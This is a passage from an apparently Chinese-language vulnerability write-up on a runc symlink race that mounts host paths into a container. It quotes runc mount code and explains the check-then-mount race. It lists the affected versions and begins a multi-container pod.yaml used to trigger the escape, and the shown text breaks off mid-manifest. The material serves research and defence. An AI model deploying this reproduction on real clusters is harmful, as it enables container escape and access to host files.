class="keyword">case</span> <span class="string">&quot;tmpfs&quot;</span>:</span><br><span class="line">    copyUp := m.Extensions&amp;configs.EXT_COPYUP == configs.EXT_COPYUP</span><br><span class="line">    tmpDir := <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">// dest might be an absolute symlink, so it needs</span></span><br><span class="line">    <span class="comment">// to be resolved under rootfs.</span></span><br><span class="line">    dest, err := securejoin.SecureJoin(rootfs, m.Destination)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    m.Destination = dest</span><br><span class="line">    stat, err := os.Stat(dest)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := os.MkdirAll(dest, <span class="number">0755</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> copyUp &#123;</span><br><span class="line">        <span class="keyword">if</span> err := fileutils.CopyDirectory(dest, tmpDir); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            errMsg := fmt.Errorf(<span class="string">&quot;tmpcopyup: failed to copy %s to %s: %v&quot;</span>, dest, tmpDir, err)</span><br><span class="line">            <span class="keyword">if</span> err1 := unix.Unmount(tmpDir, unix.MNT_DETACH); err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> newSystemErrorWithCausef(err1, <span class="string">&quot;tmpcopyup: %v: failed to unmount&quot;</span>, errMsg)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> errMsg</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := unix.Mount(tmpDir, dest, <span class="string">&quot;&quot;</span>, unix.MS_MOVE, <span class="string">&quot;&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            errMsg := fmt.Errorf(<span class="string">&quot;tmpcopyup: failed to move mount %s to %s: %v&quot;</span>, tmpDir, dest, err)</span><br><span class="line">            <span class="keyword">if</span> err1 := unix.Unmount(tmpDir, unix.MNT_DETACH); err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> newSystemErrorWithCausef(err1, <span class="string">&quot;tmpcopyup: %v: failed to unmount&quot;</span>, errMsg)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> errMsg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过条件竞争的方式，可以在路径检查和挂载操作之间将正常路径替换为符号链接。在检查阶段，路径还不是符号链接，所以不会经过处理；而在检查之后、挂载之前，将路径替换为符号链接，这样这个符号链接指向的宿主系统的路径就会被挂载到容器中</p>
<p><strong>复现</strong></p>
<p>环境：</p>
<ul>
<li>Docker: 19.03.9</li>
<li>containerd: 1.4.4</li>
<li>runc: 1.0.0-rc93</li>
<li>K8S: 1.21.0</li>
</ul>
<p>由于漏洞是发生在容器创建期间，挂载卷的竞争条件，因此要不断创建容器以触发漏洞</p>
<p>创建一个包含多个容器的pod，pod.yaml:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">pod1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">    <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c1</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">ubuntu:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c2</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c3</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c4</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c5</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c6</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c7</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c8</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c9</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c10</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c11</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c12</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c13</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c14</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span 